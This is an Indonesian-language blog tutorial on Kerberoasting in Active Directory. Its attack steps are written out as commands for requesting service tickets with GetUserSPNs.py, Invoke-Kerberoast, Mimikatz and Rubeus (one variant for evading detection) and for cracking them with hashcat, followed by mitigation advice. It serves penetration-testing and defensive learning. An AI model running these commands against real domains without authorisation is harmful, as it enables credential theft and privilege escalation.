---
title: Keberoasting
date: 2022-03-09 23:20:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, windows, keberoasting, impacket, mimikatz, rubeus, kerberoast]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

## Apa itu SPN?

**Service Principal Names (SPNs)** adalah pengidentifikasi unik dari *service instance*. SPN digunakan oleh otentikasi Kerberos untuk mengaitkan *service instance* dengan *service logon account*.

Dengan adanya SPN, suatu layanan dapat berjalan pada suatu komputer sebagai user tertentu yang dikendalikan oleh **Domain Admins**.

## Mengapa SPN dikaitkan dengan user?

Menurut [Mubix "Rob" Fuller](https://malicious.link/post/2016/kerberoast-pt1/), hal ini dilakukan agar layanan tidak berjalan sebagai **NT AUTHORITY\SYSTEM** yang akan sangat berbahaya ketika layanan tersebut berhasil dieksploitasi oleh penyerang.

## Kenapa ini penting?

Setiap user domain yang valid dapat me-*request* ticket Kerberos untuk layanan domain apa pun (atau bahkan layanan di luar domain selama ada *trust* di sana). 

Setelah tiket diterima, *password cracking* dapat dilakukan secara offline pada ticket untuk mendapatkan password user menjalankan layanan tersebut. 

User yang menjalankan layanan ini biasanya paling tidak adalah administrator di komputer yang mereka gunakan (untuk layanan), tetapi lebih umum mereka adalah semacam akun administratif (**Domain Admins**).

---

### Tujuan 

- *Privilege escalation*


### Prasyarat

- Terdapat SPN pada user domain


### Tools

- Mimikatz
- [Kerberoast Toolkit](https://github.com/nidem/kerberoast)

---

## Tahap eksploitasi

### Step 1: Dapatkan user dengan SPN

#### Via remote (Kali)

```bash
# 1. list user SPN + request service ticket
➜ GetUserSPNs.py <full-domain>/<user>:<password> -dc-ip <ip-dc> -request
```

#### Via internal (Windows)

- Invoke-Kerberoast.ps1

```powershell
# kerberoasting via Invoke-Kerberoast.ps1
PS> .\Invoke-Kerberoast.ps1
PS> invoke-kerberoast -outputformat hashcat

# oneline
PS> powershell -c import-module .\Invoke-Kerberoast.ps1; invoke-kerberoast -outputformat hashcat
```

- PowerView x Mimikatz:

```powershell
# 1. list user SPN
PS> .\GetUserSPNs.ps1

# 2. request service ticket
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "TRYHARDER-DC/SQLService.KATUHU.local:60111"

# 3. ekstrak ticket (.kirbi) menggunakan mimikatz
mimikatz > kerberos::list /export

# 4. crack de ticket
➜ python3 tgsrepcrack.py wordlist.txt file.kirbi 
```

- Rubeus:

```powershell
# Kerberoasting and outputing on a file with a spesific format
PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

# Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

# Kerberoast AES enabled accounts
PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

# Kerberoast spesific user account
PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

# Kerberoast by specifying the authentication credentials
PS> Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
```

### Step 2: Crack de hash

```bash
➜ hashcat -m 13100 pass.hash /usr/share/wordlists/rockyou.txt 
```

## Mitigasi

Terdapat beberapa mitigasi yang sangat mengurangi atau bahkan menghilangkan risiko ini, seperti:

- Tolak permintaan autentikasi yang tidak menggunakan **Kerberos Flexible Authentication Secure Tunneling (FAST)** (juga disebut *Kerberos Armoring*).
- Hilangkan penggunaan protokol yang tidak aman di Kerberos. Seperti protokol **RC4**.
- Terapkan kebijakan password yang kuat dan selalu diperbaharui. Contoh kata password adalah tidak mengandung kata yang umum, minimal 30 karakter dan diubah secara rutin.
- Jika memungkinkan, terapkan penggunaan **Grup Managed Service Accounts (gMSA)**. Kata sandi ( 256 *random bytes*) untuk gMSA dibuat dan sering diubah oleh Active Directory, menghilangkan beban ini dari administrator.
- Audit penetapan **servicePrincipalNames** ke akun pengguna sensitif. Misalnya, anggota **Domain Admins** tidak boleh digunakan sebagai *service account*.

---

## Referensi

- https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting
- https://github.com/nidem/kerberoast
- https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names?redirectedfrom=MSDN
- https://malicious.link/post/2016/kerberoast-pt1/
- https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#kerberoast
